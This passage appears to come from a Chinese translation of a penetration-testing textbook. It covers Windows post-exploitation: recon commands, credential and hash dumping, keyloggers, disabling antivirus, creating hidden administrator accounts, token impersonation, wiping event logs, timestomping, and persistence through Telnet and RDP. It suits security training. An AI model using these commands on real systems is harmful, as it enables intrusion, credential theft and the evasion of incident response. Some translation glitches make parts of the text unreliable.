  \ /domain` | 如果当前用户属于所查询的域，则获取有关该用户的信息（如果你是本地用户，则不需要 `/domain`）。它包括登录时间、最后一次更改密码的时间、登录脚本和组成员身份。\
  \ |\n| `net accounts` | 打印本地系统的密码策略。要打印域密码策略，请使用 `/domain`。 |\n| `net localgroup`\
  \ | 打印管理员组的成员。使用 `/domain` 选项获取域的管理员组。 |\n| `net group \"Domain Controllers\" /domain`\
  \ | 列出域控制器的列表。 |\n| `net share` | 显示当前的共享文件夹（可能未提供足够的访问控制）以及指向这些路径。 |\n\n### 124\n\
  \n### 第 5 章\n\n### 使用 WMIC 脚本语言\n\n在较新的系统中，攻击者和渗透测试人员利用内置脚本语言，例如 Windows 管理命令行 (WMIC)，这是一个用于简化访问\
  \ Instrumentation 的命令行和脚本界面。如果被攻破的系统支持 `WMIC`，可以使用多个命令收集信息。参考下表：\n\n| 命令 |  |\n\
  | :--- | :--- |\n| `wmic nicconfig get` | 获取 IP 地址和 MAC 地址 `ipaddress,macaddress`\
  \ |\n| `wmic computersystem get` | 验证渗透账户 `username` |\n| `wmic netlogin get` |\
  \ 确定最后何时使用了该系统 `lastlogon` |\n| `wmic desktop get` | 确定屏幕保护是否有密码 `screensavercure,\
  \ protected` 以及超时时间 `screensavertimeout` |\n| `wmic logon get` | 确定支持哪些登录方法 `authenticationpackage`\
  \ |\n| `wmic process get` | 识别系统进程 `caption,executablepath,commandline` |\n| `wmic\
  \ process where` | 终止特定进程 `name=\"process_name\" call terminate` |\n| `wmic os get`\
  \ | 系统的操作系统 `servicepackmajorversion` |\n| `wmic product get` | 识别已安装的软件 `version`\
  \ |\n| `wmic product where` | 卸载或移除定义的软件包 `name=\"name\" call uninstall /nointeractive`\
  \ |\n| `wmic share get /ALL` | 识别用户可访问共享 |\n| `wmic /node:\"machinename\" Starts\
  \ RDP remotely path Win32_TerminalServiceSetting where AllowTSConnections=\"0\"\
  \ call SetAllowTSConnections \"1\"` |\n| `wmic nteventlog get` | 查找所有系统事件日志并确保 `filename,writeable`\
  \ 可以被修改（在需要掩盖踪迹时使用） |\n\n\n\n\n\n`PowerShell` 是一种基于 `.NET Framework` 构建的脚本语言，它从控制台运行，使用户可以访问\
  \ Windows 文件系统和注册表等对象。它在 Windows 7 及更高版本的操作系统中默认安装。`PowerShell` 通过允许在本地和远程目标上使用\
  \ shell 集成和互操作，扩展了 `WMIC` 提供的脚本支持和自动化功能。\n\n`PowerShell` 为测试人员提供了在受损系统上访问 shell\
  \ 和脚本语言的权限。由于它是 Windows 操作系统的原生工具，其对命令的使用不会触发杀毒软件。当脚本在远程系统上运行时，`PowerShell` 不会将内容写入磁盘，从而绕过了了杀毒软件和白名单控制（假设用户已允许使用\
  \ `PowerShell`）。\n\n`PowerShell` 支持许多被称为 `cmdlets`（命令项）的内置函数。`PowerShell` 的优势之一是\
  \ cmdlets 被别命名为常见的 Unix 命令，因此输入 `ls` 命令将返回典型的目录列表，如下截图所示：\n\n![](img/index-143_1.png)\n\
  \n[126]\n\n## 第 5 章\n\n`PowerShell` 是一种功能强大的语言，能够支持非常复杂的操作；建议用户花时间熟悉其使用方法。下表描述了在受攻击后可以立即使用的一些简单命令：\n\
  \n| 命令 |  |\n| :--- | :--- |\n| `Get-Host Select Version` | 识别受害者系统使用的 `PowerShell`\
  \ 版本。不同的版本中添加或调用了不同的 cmdlets。 |\n| `Get-Hotfix` | 识别已安装的安全补丁和系统热修复。 |\n| `Get-Acl`\
  \ | 识别组名和用户名。 |\n| `Get-Process`, `Get-Service` | 列出当前的进程和服务。 |\n| `gwmi win32_useraccount`\
  \ | 调用 `WMI` 列出用户账户。 |\n| `Gwmi_win32_group` | 调用 `WMI` 列出 SID、名称和域组。 |\n\n渗透测试人员可以结合使用\
  \ Windows 原生命令、DLL、`.NET` 函数、`WMI` 调用和 `PowerShell` cmdlets，来创建扩展名为 `.ps1` 的 `PowerShell`\
  \ 脚本。\n\n在最近的一次渗透测试中，我们被禁止在客户端系统上安装任何可执行软件。我们在受损系统上使用 `PowerShell` 键盘记录器来获取管理员级凭据，然后攻破了网络上的大部分系统。最有效的利用和后利用脚本（包括键盘记录器）属于\
  \ Nikhil Mittal 的 `Nishang` 软件包（https://code.google.com/p/nishang/downloads/detail?name=nishang_0.3.0.zip）。\n\
  \n侦察也应扩展到本地网络。由于你是在“盲目”工作，你需要创建一张受损主机可以通信的活动系统和子网地图。首先在 shell 提示符中输入 `IFCONFIG`（基于\
  \ Unix 的系统）或 `IPCONFIG /ALL`（Windows 系统）。这将允许攻击者确定以下信息：\n\n* 是否启用了 DHCP 地址分配。\n\
  * 本地 IP 地址，这将识别出至少一个活跃的子网。\n\n[127]\n\n## 漏洞利用 – 目标行动\n\n* 网关 IP 地址和 DNS 服务器地址。系统管理员通常在整个网络中遵循编号规范，如果攻击者知道一个地址（例如网关服务器\
  \ `172.16.21.5`），他们将 ping 如 `172.16.20.5`、`172.16.22.5` 等地址以寻找额外的子网。\n* 用于利用 `Active\
  \ Directory` 账户的域名。\n\n如果攻击系统和目标系统都使用 Windows，可以使用 `net view` 命令列出网络上的其他 Windows\
  \ 系统。攻击者使用 `netstat -rn` 命令查看路由表，该表中可能包含通往感兴趣的网络或系统的静态路由。\n\n可以使用 `nmap` 扫描本地网络以嗅探\
  \ ARP 广播。此外，Kali 还有几个工具可以用于 SNMP 端点分析，包括 `nmap`、`onesixtyone` 和 `snmpcheck`。\n\n\
  部署数据包嗅探器来映射流量将帮助你识别主机名、活跃子网和域名。如果没有启用 DHCP 地址分配，它还将允许攻击者识别任何未使用的静态 IP 地址。Kali 预装了\
  \ `Wireshark`（一种基于 GUI 的数据包嗅探器），但你也可以在后利用脚本或从命令行中使用 `tshark`，如下截图所示：\n\n![](img/index-145_1.png)\n\
  \n[128]\n\n## 第 5 章\n\n### 寻找并获取敏感数据 – 掠夺目标\n\n`pillaging`（有时称为 `pilfering`）一词是那个时代的遗留，当时成功攻破系统的黑客将自己视为冲向目标的海盗，尽可能地窃取或破坏数据。这些术语保留了下来，作为对在实现利用目标后，更谨慎地窃取或修改专有或财务数据的参考。\n\
  \n攻击者随后可以关注次级目标——将提供支持额外攻击信息的系统文件。次级文件的选择取决于目标的操作系统。例如，如果受损系统是 Unix，那么攻击者还将针对以下目标：\n\
  \n* 系统和配置文件（通常在 `/etc` 目录下，但取决于实现，它们可能在 `/usr/local/etc`）\n* 密码文件（`/etc/password`\
  \ 和 `/etc/shadow`）\n* `.ssh` 目录下的配置文件和密钥\n* 可能位于 `.gnupg` 目录的公密钥环\n\n在 Windows 系统中，攻击者将针对：\n\
  \n* 注册表文件\n* 安全账户管理器（SAM）数据库，包含密码的哈希版本，或其他版本的 `SAM`，可能位于 `%SYSTEMROOT%\\repair\\\
  SAM` 和 `%SYSTEMROOT%\\System32\\config\\RegBack\\SAM`\n* 任何其他用于加密的种子文件\n\n不要忘记检查包含附件的文件夹，例如\
  \ `UserProfile\\AppData\\Local\\Windows\\Temporary Internet Files\\` 可能包含感兴趣的文件、图像和\
  \ Cookie。\n\n[129]\n\n## 漏洞利用 – 目标行动\n\n如所述，系统内存包含了攻击者所需的大量信息。因此，它通常是你需要的优先级文件。系统内存可以通过以下来源下载为单个镜像文件：\n\
  \n* 通过向受损系统上传工具并直接复制内存（工具包括 `Belkasoft RAM capturer`、`MandiantMemoryze` 和 `DumpDumpIt`）。\n\
  * 通过复制 Windows 休眠文件 `hiberfil.sys` 并使用 `Volatility` 解密和分析该文件。\n* 通过复制虚拟机并将 `VMEM`\
  \ 文件转换为内存文件。\n\n\n\n\n为了避免这种情况，请使用 Metasploit Framework，通过以下命令在目标的内存中完全运行可执行文件：\n\
  \n```\nmeterpreter> execute -H -m -d calc.exe -f\n```\n\n可执行文件 + 参数>\n\n之前的命令将 `calc.exe`\
  \ 作为虚拟可执行文件执行，但会上传内存获取可执行文件并运行在它的进程空间中。\n\n该可执行文件不会显示在任务管理器等进程列表中，而且使用数据取证技术进行检测也要困难得多，因为它没有被写入磁盘。此外，它将避开系统的杀毒软件，因为这些软件通常不会扫描内存空间以寻找恶意软件。\n\
  \n[130]\n\n## 第 5 章\n\n一旦下载了物理内存，就可以使用 `Volatility Framework` 进行分析，这是一个由 Python\
  \ 脚本集合，专门用于内存取证分析。如果支持该操作系统，`Volatility` 将扫描内存文件并提取以下内容：\n\n• 足够将镜像与其源系统关联的信息和系统数据。\n\
  • 运行的进程、加载的 `DLLs`、线程、套字、连接和模块。\n• 开放的网络套字和连接，以及最近打开的网络连接。\n• 内存地址，包括物理和虚拟内存映射。\n\
  • `LM/NTLM` 哈希和 `LSA` 密钥。`LanMan` (`LM`) 密码哈希是微软保护密码的原始尝试。多年来，破解它们并将哈希转换回实际密码已变得简单。`NT\
  \ LanMan` (`NTLM`) 哈希较新且更具抗性。然而，它们通常为了向后兼容而与 NTLM 版本一起存储。`Local Security Authority`\
  \ (`LSA`) 存储了“密钥”，即本地密码：远程访问（有线或无线）、VPN、自动登录密码等。存储在系统上的任何密码都是脆弱的，特别是当用户重用密码时。\n\
  • 存储在内存中的特定正则表达式或字符串。\n\n使用受 Zeus 恶意软件感染的系统镜像（https://code. google.com/p/volatility/wiki/SampleMemoryImages），我们将使用\
  \ `Volatility Framework` 提取加密的 LanMan 密码哈希。\n\n第一步是通过以下命令确定镜像类型和操作系统：\n\n```\nroot@kali:usr/share/volatility#\
  \ python vol.py imageinfo -f /root/Desktop/zeus.vmem\n```\n\n[131]\n\n### 漏洞利用后\
  \ – 目标行动\n\n上一命令的执行结果如下截图所示：\n\n![](img/index-149_1.png)\n\n当使用以下命令调用 `hivelist`\
  \ 插件时，它将打印各种注册表配置单元的初始虚拟内存位置：\n\n```\nroot@kali:usr/share/volatility#python vol.py\
  \ hivelist -f /root/Desktop/zeus.vmem\n```\n\n上一命令的执行结果如下截图所示：\n\n![](img/index-149_2.png)\n\
  \n为了转储哈希，需要 `SAM` 和 `SYSTEM` 配置单元的初始虚拟内存位置。使用以下命令，将结果重定向到逗号分隔的文件中，以便密码破解程序直接导入：\n\
  \n```\nroot@kali:usr/share/volatility#python vol.py hashdump -f /root/Desktop/zeus.vmem\
  \ -y 0xe101b008 -s 0xe1544008 >>/root/Desktop/hashdump.csv\n```\n\n[132]\n\n## 第\
  \ 5 章\n\n上一命令的执行结果如下截图所示：\n\n![](img/index-150_1.png)\n\n孤立的 `LM` 哈希可以使用 `Hashcat`、`John\
  \ the Ripper`、`Ophcrack` 和 `Rainbow Tables` 进行破解。\n\n#### 创建额外账户 以下命令具有很强的侵入性，通常会被系统所有在事件响应过程中发现。然而，攻击者经常部署这些命令，以转移注意力，避开更持久的访问机制。参考下表：\n\
  \n| 命令 | 说明 |\n| :--- | :--- |\n| `net user attacker password /add attacker` | 创建一个名为\
  \ attacker 的新本地账户，密码为 password。 |\n| `net localgroup administrators /add attacker`\
  \ | 将新用户 attacker 添加到本地管理员组。在某些情况下，命令为 `net localgroup administrators /add attacker`。\
  \ |\n| `net user username /active:yes` | 将非活动或被禁用的账户更改为/域 激活状态。在小型组织中，这将引起注意。密码管理糟糕的大型企业可能有\
  \ 30% 的密码被标记为“非活动”，因此这可能是获取账户的有效方法。 |\n| `net share name$=C:\\ /grant:attacker,FULL`\
  \ | 将 C:（或其他指定的驱动器）作为 Windows 共享，并授予用户（attacker）无限完全权限，以访问或修改该驱动器上的所有内容。 |\n\n[133]\n\
  \n### 漏洞利用后 – 目标行动\n\n如果你创建了一个新用户账户，当任何人登录到受感染系统的欢迎屏幕时，会被注意到。为了让账户不可见，你需要使用以下 `REG`\
  \ 命令从命令行修改注册表：\n\n```\nREG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\\
  CurrentVersion\\WinLogon\\SpecialAccounts\\UserList /V account_name /T REG_DWORD\
  \ /D 0\n```\n\n这将修改指定的注册表项以隐藏用户账户 (`/V`)。再次，根据目标操作系统的特定版本，可能有特殊的语法要求，因此请确定 Windows\
  \ 版本。\n\nMetasploit 的开发是为了支持漏洞利用和后后活动。在实施它之前，首先确定 Windows 版本并在控制环境中进行验证。目前的版本包含大约\
  \ 200 个模块。\n\n在接下来的截图中，我们成功利用了 Windows XP 系统。第一步是立即对受感染系统进行侦察。\n\n初始的 meterpreter\
  \ shell 是脆弱的，随着时间的推移可能会失败。因此，一旦系统被利用，我们将 shell 迁移到一个更稳定的进程。\n\n在 meterpreter 提示符处，输入\
  \ `ps` 获取进程列表，如下截图所示：\n\n[134]\n\n## 第 5 章\n\n![](img/index-152_1.png)\n\nps 命令还会返回每个进程的完整路径。这在之前的截图中省略了。`ps`\
  \ 列表识别出 `c:\\windows\\Explorer.EXE` 正在运行。在特定情况下，它被标识为进程 ID `1460`，如下截图所示。由于这是一个稳定的应用程序，我们将\
  \ shell 迁移到该进程。\n\n![](img/index-152_2.png)\n\n现在我们与远程建立了稳定的 shell 连接，将使用支持后利用活动的\
  \ meterpreter 脚本。\n\n[135]\n\n### 漏洞利用后 – 目标行动\n\n要识别的首要参数之一是：是否在虚拟机上？在攻击者与攻击系统之间打开\
  \ meterpreter 会话后，发出 `run checkvm` 命令，如下截图所示。返回的数据表明这是一个 VMware 虚拟机。\n\n![](img/index-153_1.png)\n\
  \n通过 meterpreter 可用的某些重要的后利用模块如下表：\n\n| 命令 | same |\n| :--- | :--- |\n| `run checkvm`\
  \ | 确定是否存在虚拟机。 |\n| `run getcountermeasure` | 检查被利用系统的安全配置（杀毒软件、防火墙等）。 |\n| `run\
  \ killav` | 禁用受感染系统上运行的大多数杀毒服务。该脚本经常过期，应手动验证成功性。 |\n| `run hostsedit` | 允许攻击者向 Windows\
  \ 添加条目 |\n\n\n\n\n\nHOSTS 文件。这可以将流量重定向到不同的站点（伪造站点），该站点下载额外的工具，或确保杀病毒软件无法连接互联网或本地服务器获取签名更新。\n\
  \n`run winenum` 对受攻击的系统执行命令行和 `WMIC` 特征分析。它会从注册表和 `LM` 哈希中导出重要密钥。\n\n`run scraper`\
  \ 收集其他脚本未收集的全信息，例如整个 Windows 注册表。\n\n`run upload` 和 `run download` 允许攻击者在目标系统中上传和下载文件。\n\
  \n[136]\n\n## 第 5 章\n\n| 命令 | 说明 |\n| :--- | :--- |\n| `run keyscan_start`, `run`\
  \ | 在受攻击系统上启动和停止本地键盘记录器（`run keyscan_stop` 和 `run system`）。当数据收集完成后，`run keyscan_dump`\
  \ 将收集到的文本数据转储到攻击者的系统上。 |\n| `run getprivs` | 尝试启用当前进程的所有可用权限。这对于权限提升非常有用。 |\n| `run\
  \ getsystem` | 尝试将权限提升到 Windows `SYSTEM` 级别；授予用户权限最高程度的提升。 |\n| `Run hashdump` |\
  \ 将攻击者系统上的 `SAM` 数据库内容转储。 |\n| `run getgui` | 允许用户启用 RDP (`getgui -e`) 并设置用户名和密码\
  \ (`getgui -u`)。`gettelnet` 脚本可以以相同的方式运行。 |\n| `run vnc` | 为攻击者提供对受害系统的远程 GUI (VNC)。\
  \ |\n\n最有效的 meterpreter 脚本之一是**Windows 枚举器** (`winenum`)。如接下来的截图所示，它同时使用命令行和 `WMIC`\
  \ 调用来完全对目标系统进行特征描述：\n\n![](img/index-154_1.png)\n\n[137]\n\n### 漏洞利用后 – 目标行动\n\n\
  除了枚举之外，`winenum` 脚本还会导出注册表并收集系统哈希以便解密，如下面的截图所示：\n\n![](img/index-155_1.png)\n\n\
  meterpreter 带有几个支持复杂函数的有用库。例如，`espia` 库支持通过以下命令获取受害系统的截图：\n\n```\nmeterpreter> use\
  \ espia\nLoading extension espia ... success.\nmeterpreter> screenshot /Desktop/target.jpeg\n\
  Screenshot saved to: /root/xsWoDDbW.jpeg\n```\n\n`stdapi` 库允许远程攻击者通过收集受害系统的音频和视频来操控摄像头，并将这些数据回传给攻击者。\n\
  \n[138]\n\n## 第 5 章\n\n### 提升受害主机上的用户权限\n\n通常可以获取系统的访客（Guest）或用户（User）访问权限。攻击者访问重要信息的能力往往受到这种低权限级别的限制。因此，一种常见的漏洞利用后活动是将访问权限从\
  \ Guest 提升到 User，最后提升到 `SYSTEM`。这种获取访问权限的向上进展通常被称为**垂直提升**。\n\n用户可以实现多种方法来获取高级访问凭据，包括：\n\
  \n- 使用网络嗅探器和/或键盘记录器捕获传输的用户凭据（`dsniff` 设计用于从实时传输或从 `Wireshark` 或 `tshark` 会话保存的 `pcap`\
  \ 文件中提取密码）。\n- 对本地存储的密码进行搜索。某些用户会在电子邮件文件夹（通常称为 `passwords`）中收集密码。由于密码重用和简单的密码构建系统很常见，发现的密码可以在提升过程中使用。\n\
  - NirSoft (www.nirsoft.net) 制作了多个免费工具，可以使用 `meterpreter` 上传到受害系统，以从操作系统和缓存密码的应用程序（邮件、远程访问软件、FTP\
  \ 和网络浏览器）中提取密码。\n- 使用 `meterpreter` 或 `hobocopy`、`fgdump` 和 `pwdump` 等应用程序转储 `SAM`\
  \ 和 `SYSKEY` 文件（这些可以使用 `meterpreter` 上传到目标）。\n- 使用 process injector (www.tarasco.org/security/Process_Injector/)\
  \ 等工具将恶意代码直接注入运行在 `SYSTEM` 级别的服务中。\n- 当某些应用程序加载时，它们按特定顺序读取**动态链接库** (`DLL`) 文件。可以创建一个与合法\
  \ DLL 同名的伪造 DLL，将其放在特定的目录位置，并让应用程序加载执行它，从而导致攻击者获得提升权限。已知多个应用程序易受到此类 DLL 劫持（www.exploit-db.com/dll-hijacking-vulnerable-applications/）。\n\
  \n[139]\n\n### 漏洞利用后 – 目标行动\n\n- 应用使用缓冲区溢出或其他手段提升权限的漏洞。\n- 从 meterpreter 提示符执行 `getsystem`\
  \ 脚本，它会自动将管理员权限提升到 `SYSTEM` 级别。\n\nWindows 7 和 2008 不允许从不受信任的系统远程访问管理共享（例如 `ADMIN$`、`C$`\
  \ 等）。这些共享可能是 `meterpreter` 脚本（如 `incognito`）所需的或用于支持 SMB 攻击。为了解决这个问题，向注册表中添加 `HKEY_LOCAL_MACHINE\\\
  SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`，并添加名为 `LocalAccountTokenFilterPolicy`\
  \ 的新 `DWORD`（32 位）键并将值设置为 1。\n\n**使用 incognito** 一个特别有趣的 meterpreter 库是 `incognito`，它允许你伪装和重放用户令牌。令牌是临时密钥，允许你**重放身份验证令牌**。一旦你破解了系统，就可以使用令牌伪装之前的用户，而无需提供密码。这些令牌会一直存在于系统中直到重启。\n\
  \n在提示符处，输入以下内容：\n\n```\nmeterpreter> use incognito\n```\n\n上一个命令的执行结果如下截图所示：\n\n\
  ![](img/index-157_1.png)\n\n[140]\n\n## 第 5 章\n\n第一步是识别受害系统上存在的所有有效令牌。你可以看到的令牌数量取决于最初用于破解系统时的访问权限级别。\n\
  \n你还会看到两种类型的令牌，如下面的截图所示。委托令牌（Delegation tokens）支持交互式登录（例如，本地登录系统或通过远程桌面登录）。仿充令牌（Impersonate\
  \ tokens）用于非交互式会话，例如系统连接到网络驱动器时。\n\n![](img/index-158_1.png)\n\n如你所见，已识别出一个管理员委托令牌。如果我们能仿充此令牌，就可以可以使用它的权限。\n\
  \n在 `incognito` 中调用 `impersonate_token` 命令时（如下截图所示），注意命令中需要两个反斜杠：\n\n![](img/index-158_2.png)\n\
  \n现在，如果我们从 meterpreter 提示符运行 `shell` 命令并输入 `whoami`，它会将我们识别为被仿充的管理员。\n\n[141]\n\n\
  ### 漏洞利用后 – 目标行动\n\n#### 使用 Windows Credential Editor 操控访问凭据\n\n**Windows Credential\
  \ Editor** (`WCE`) —— http://www.amplisecurity.com/research/wcefaq.html 是 `incognito`\
  \ 脚本的精炼版本。它提供 32 位和 64 位版本，以及声称可以在所有 Windows 平台上运行的“通用”版本。`WCE` 允许用户执行以下操作：\n\n\
  - 在 Windows 系统上执行哈希传递攻击\n- 从系统内存中收集 NTLM 凭据（使用或不代码注入）\n- 从 Windows 系统收集 Kerberos\
  \ 票据\n- 在其他 Windows 或 Unix 系统上使用收集到的 Kerberos 票据以获取访问\n\n\n\n\n\n-   转储 Windows\
  \ 系统存储的明文密码（见下节）\n\n要使用 `WCE`，请从 `meterpreter` 提示符将可执行文件上传到被受攻击的系统。然后，启动交互式 shell\
  \ 并执行 `WCE`。如下截图所示，`-w` 选项轻松地提取了明文 Administrator 密码：\n\n![](img/index-159_1.png)\n\
  \n[142]\n\n## 第 5 章\n\n### 从 Administrator 提升到 SYSTEM\n\nAdministrator 权限允许攻击者创建和管理账户，并访问系统上可用的大部分数据。然而，某些复杂功能要求请求者具有\
  \ SYSTEM 级访问权限。有几种方法可以继续这种到 SYSTEM 级的提升。最常用的方法是使用 `at` 命令，Windows 使用该命令为特定时间调度任务。`at`\
  \ 命令始终以 SYSTEM 级的权限运行。\n\n使用交互式 shell（在 `meterpreter` 提示符处输入 `shell`），打开命令提示符并确定受攻击系统的本地时间。如果时间是下午\
  \ 12:50 P.M.（`at` 函数使用 24 小时制），则为稍后时间调度交互式命令 shell，如下截图所示：\n\n![](img/index-160_1.png)\n\
  \n在调度 `at` 任务后，在 `meterpreter` 提示符处重新确认您的访问权限，如下截图所示：\n\n![](img/index-160_2.png)\n\
  \n如你所示，权限已经提升到 SYSTEM 级。\n\n**escalation** 在水平提升中，攻击者保留现有的凭据，但使用它们对不同用户的账户进行操作。例如，受攻击系统\
  \ A 上的用户 `Accessing new accounts with horizontal` 攻击系统 B 上的用户，试图攻破他们。\n\n在我们查看某些攻击向量（例如远程访问攻击）时，我们将使用水平提升攻击。\n\
  \n[143]\n\n### 漏洞利用后 – 针对目标的行动\n\n## 掩盖踪迹\n\n一旦系统被利用，攻击者必须掩盖踪迹以避免检测，或者至少让防御者重建事件变得更加困难。\n\
  \n攻击者可以完全删除 Windows 事件日志（如果这些日志在受攻击的服务器上被保留）。可以通过对系统的命令 shell 并使用以下命令来实现：\n\n```\n\
  C:\\ del %WINDIR%\\*.log /a/s/q/f\n```\n\n该命令指示删除所有日志（`/a`），包括所有子文件夹中的文件（`/s`）。`/q`\
  \ 选项禁用了所有查询（不再询问 *yes* 或 *no* 响应），`/f` 选项强制删除文件，使恢复变得困难。\n\n这也可以在 `meterpreter`\
  \ 提示符处通过执行 `clearev` 命令来实现。这将清除目标机的应用程序、系统和安全日志（该命令没有选项或参数）。\n\n通常，删除系统日志不会向用户触发任何警报。事实上，大多数组织配置日志的方式非常草率，以至于系统日志的缺失被视为可能发生的情况，其丢失不会引起深入调查。\n\
  \nMetasploit 还有另一个杀手锏——`timestomp` 选项允许攻击者更改文件的 MACE 参数（文件的最后修改时间、访问时间、创建时间和 MFT\
  \ 条目修改时间）。一旦系统被攻破并建立了 `meterpreter` shell，就可以调用 `timestomp`，如下截图所示：\n\n![](img/index-161_1.png)\n\
  \n[144]\n\n## 第 5 章\n\n例如，受攻击系统的 `C:` 包含一个名为 `README.txt` 的文件。该文件的 MACE 值表明它是最近创建的，如下截图所示：\n\
  \n![](img/index-162_1.png)\n\n如果我们想隐藏此文件，可能会将其移动到杂乱的目录，例如 `windows\\system32`。然而，对于任何根据创建日期或其他\
  \ MAC 变量对该目录内容排序的人来说，该文件将是显而易见的。因此，要将 `cmd.exe` 文件的 MAC 信息复制到 `README.txt` 文件，请使用以下命令：\n\
  \n```\nmeterpreter>timestomp README.txt -f\n```\n\n`C:\\WINDOWS\\system32\\cmd.exe`\n\
  \n我们也可以选择使用 `-b` 切换清空 MAC 数据。如下截图所示，我们选择将 MAC 数据更改为未来的时间（2106 年）。\n\n![](img/index-162_2.png)\n\
  \n[145]\n\n### 漏洞利用后 – 针对目标的行动\n\n这种更改会引起调查人员的注意，但他们将无法利用这些数据进行取证分析。原始 Windows 平台上的属性是什么样子的？如果系统管理员调用文件的系统属性，创建和修改日期已改回\
  \ 1601 年（微软使用的初始系统启动时间）。相比之下，该文件的最后访问时间仍然保持准确。你可以在以下截图看到这一点：\n\n![](img/index-163_1.png)\n\
  \n虽然这是预期中的行为，但它仍然为调查人员提供了线索。为了彻底破坏调查，攻击者可以使用以下命令递归地更改目录或特定驱动器上的所有设置时间：\n\n```\n\
  meterpreter>timestompC:\\ -r\n```\n\n解决方案并不完美。攻击已经发生是非常而易见的。此外，时间戳可能会保留在硬盘的其他位置，并供调查访问。如果目标系统运行监控系统完整性的入侵检测系统（如\
  \ Tripwire），将产生 timestomp 活动的警报。因此，当真正需要隐蔽方法时，破坏时间戳的有限。\n\n[146]\n\n## 第 5 章\n\n\
  **Summary** 在本章中，我们关注了利用系统后的立即行动。我们回顾了为了特征服务器和本地环境进行的初步评估。我们还学习了如何识别和定位感兴趣的文件、创建账户、执行权限提升以及移除入侵痕迹。\n\
  \n在下一章中，我们将学习如何实现持久化后门以保留访问权限，并学习与受攻击系统进行秘密通信的技术。\n\n[147]\n\n### 漏洞利用后 – 持久化\n\n\
  攻击者攻击链的最后一个阶段是“命令、控制和通信”阶段，攻击者依赖于与受攻击系统的持久连接以确保他们能够继续控制。\n\n为了有效，攻击者必须能够维持**交互式持久化**——他们必须与被利用的系统建立双向通信通道（交互式），该通道在受攻击系统上长时间保留而不被发现（持久化）。这种连接是必要的，由于以下原因：\n\
  \n- 网络入侵可能会被检测，受攻击的系统可能会被识别并修复\n- 某些漏洞只能利用一次，因为漏洞是间歇性的、利用会导致系统崩溃，或者因为利用强制系统发生变化导致漏洞无法使用\n\
  - 攻击者由于各种原因可能多次返回同一目标\n- 目标的用途在攻破时并不总是立即已知\n\n用于维持交互式持久化的工具通常被称为经典术语，如后门（backdoor）或根内核攻击包（rootkit）。然而，自动化恶意软件和人类攻击对长期持久化的趋势模糊了传统标签的含义；因此，我们将意图在受攻击系统上长时间停留的恶意软件称为**持久化代理**（persistent\
  \ agents）。\n\n\n\n\n\n这些持久化代理（persistent agents）为攻击者和渗透测试人员执行许多功能，包括：\n\n- 允许上传额外的工具以支持新的攻击，特别是针对位于同一网络上的系统。\n\
  - 方便从被控的系统和网络中外泄数据。\n\n### 漏洞利用 – 持久化（Post Exploit – Persistence）\n\n- 允许攻击者重新连接到被控的系统，通常通过加密通道以避免检测。众\
  \ own 持久化代理可以在系统中停留一年多。\n- 使用反取证技术以避免被检测，包括隐藏在目标的文件系统或系统内存中、使用强身份验证以及使用加密。\n\n在本章中，你将学习到以下内容：\n\
  \n- 破坏现有的系统和应用程序文件以实现远程访问\n- 创建持久化代理\n- 使用 Metasploit Framework 维持持久化\n- 重定向端口以绕过网络控制\n\
  \n#### 破坏现有的系统和应用程序文件以实现远程访问\n最好的持久化代理是那些不需要隐藏的，因为它们是被控系统现有文件结构的一部分；攻击者只需向常规系统文件和应用程序添加某些功能，即可将其转换为持久化代理。这种方法几乎无法被入侵检测系统（IDS）等安全控制措施检测。\n\
  \n#### 远程启用 Telnet 服务\n维持远程访问的一种技术是使用 Metasploit Framework 在 Windows 平台上启用 Telnet\
  \ 服务，并利用它提供持久化。\n\n第一步是破坏目标系统以获取 `meterpreter` 会话（迁移会话以确保 shell 稳定），然后提升访问权限。\n\n\
  [150]\n\n## 第 6 章\n\n接下来，使用以下命令获取本地命令 shell 以访问目标系统：\n\n```bash\nmeterpreter> execute\
  \ -H -f cmd -i\n```\n\n执行该命令后，它会创建一个交互式命令 shell（`-i`），并作为一个隐藏进程运行（`-H`）。\n\n使用 shell\
  \ 的命令提示符创建一个新用户账户。在创建用户账户以确保持久化时，许多攻击者会使用以下两部分策略：\n\n- 创建一个在调查入侵时会引起注意的名称（例如，`Leet7737`）\n\
  - 使用以下命令创建一个看似正常系统功能的一部分账户，例如 `Service_Account`：\n\n```cmd\nC:\\net user Service_Account\
  \ password /ADD\nC:\\net localgroup administrators Service_Account /ADD\n```\n\n\
  当新用户账户创建完成后，退出 Windows 命令提示符。\n\n要启用 Telnet，在 meterpreter 提示符中运行以下命令：\n\n```bash\n\
  run gettelnet -e\n```\n\n上一条命令的执行结果如下所示：\n\n![](img/index-168_1.png)\n\n[151]\n\n\
  ### 漏洞利用 – 持久化（Post Exploit – Persistence）\n\n上一幅截图显示的脚本在被控系统上创建了一个持久化的 Telnet 服务。要访问它，使用\
  \ Telnet 协议连接到系统的 IP 地址，并提供创建账户时使用的用户名和密码，如下截图所示：\n\n![](img/index-169_1.png)\n\n\
  Telnet 服务将一直存在，直到被移除为止。遗憾的是，使用 Telnet 有一些局限性：它很容易被检测（尤其是因为凭据是明文传输的），而且它只在命令行模式下运行。\n\
  \n然而，如果你需要一个 GUI 来访问被控系统上的某些应用程序怎么办？\n\n#### 远程启用 Windows 终端服务\n确保远程访问的最可靠技术之一是持久化地启用\
  \ Windows 终端服务，也称为远程桌面协议（`RDP`）。要做到这一点，你必须拥有管理员权限并知道目标操作系统的版本。\n\n例如，如果目标是 Windows\
  \ 7，使用 `meterpreter` 在目标上获取一个交互式命令 shell，然后输入以下命令更改注册表：\n\n```cmd\nC:\\ reg add\
  \ \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\"\
  \ /t REG_DWORD /d 0x1 /f\nC:\\reg add \"hklm\\system\\currentControlSet\\Control\\\
  Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f\n```\n\n[152]\n\
  \n## 第 6 章\n\n为了确保 RDP 能够通过客户端防火墙，使用以下命令添加规则：\n\n```cmd\nC:\\ netsh advfirewall\
  \ firewall set rule group=\"remote desktop\" new enable=Yes\n```\n\n现在我们可以使用以下命令启动\
  \ RDP 服务：\n\n```cmd\nC:\\net start Termservice\n```\n\n启动 RDP 的更改尚未实现持久化；使用以下命令在每次计算机启动时自动启动\
  \ RDP：\n\n```cmd\nC:\\sc config TermService start= auto\n```\n\n启用 RDP 的过程并不复杂，但应该通过脚本来实现以减少错误可能性，特别是在处理系统注册表时。幸运的是，`meterpreter`\
